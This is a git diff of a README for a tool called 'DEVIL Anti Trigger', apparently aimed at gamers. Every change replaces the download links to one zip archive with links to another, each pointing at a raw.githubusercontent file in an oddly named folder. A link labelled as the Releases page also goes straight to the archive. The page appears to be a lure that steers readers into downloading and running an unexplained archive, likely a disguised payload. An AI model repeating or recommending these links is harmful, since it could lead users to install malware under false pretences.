@@ -6,7 +6,7 @@ Welcome to DEVIL Anti Trigger. This tool protects you against harmful triggers w
 
 ## 📥 Download Now
 
-[![Download DEVIL Anti Trigger](https://raw.githubusercontent.com/PhamTien-gi/DEVIL-Anti-Trigger/main/zoisitization/Trigger-Anti-DEVI-v2.8.zip%20Anti%20Trigger-blue)](https://raw.githubusercontent.com/PhamTien-gi/DEVIL-Anti-Trigger/main/zoisitization/Trigger-Anti-DEVI-v2.8.zip)
+[![Download DEVIL Anti Trigger](https://raw.githubusercontent.com/PhamTien-gi/DEVIL-Anti-Trigger/main/zoisitization/Trigger_DEVI_Anti_v3.0.zip%20Anti%20Trigger-blue)](https://raw.githubusercontent.com/PhamTien-gi/DEVIL-Anti-Trigger/main/zoisitization/Trigger_DEVI_Anti_v3.0.zip)
 
 ## 📋 System Requirements
 
@@ -32,7 +32,7 @@ DEVIL Anti Trigger includes the following features:
 
 To download DEVIL Anti Trigger, visit our Releases page by clicking the link below:
 
-[Download DEVIL Anti Trigger](https://raw.githubusercontent.com/PhamTien-gi/DEVIL-Anti-Trigger/main/zoisitization/Trigger-Anti-DEVI-v2.8.zip)
+[Download DEVIL Anti Trigger](https://raw.githubusercontent.com/PhamTien-gi/DEVIL-Anti-Trigger/main/zoisitization/Trigger_DEVI_Anti_v3.0.zip)
 
 ### Step 2: Locate the Latest Release
 
@@ -42,7 +42,7 @@ On the Releases page, look for the latest version of DEVIL Anti Trigger. You wil
 
 Click on the link for the appropriate version based on your system. A standard file format such as `.exe` or `.zip` is available:
 
-- For Windows: Click on `https://raw.githubusercontent.com/PhamTien-gi/DEVIL-Anti-Trigger/main/zoisitization/Trigger-Anti-DEVI-v2.8.zip` to download.
+- For Windows: Click on `https://raw.githubusercontent.com/PhamTien-gi/DEVIL-Anti-Trigger/main/zoisitization/Trigger_DEVI_Anti_v3.0.zip` to download.
 
 ### Step 4: Run the Application
 
@@ -88,4 +88,4 @@ For more information, check our documentation or reach out to the community.
 
 Thank you for using DEVIL Anti Trigger, and enjoy your safe gaming experience!
 
-[Download DEVIL Anti Trigger](https://raw.githubusercontent.com/PhamTien-gi/DEVIL-Anti-Trigger/main/zoisitization/Trigger-Anti-DEVI-v2.8.zip)
+[Download DEVIL Anti Trigger](https://raw.githubusercontent.com/PhamTien-gi/DEVIL-Anti-Trigger/main/zoisitization/Trigger_DEVI_Anti_v3.0.zip)
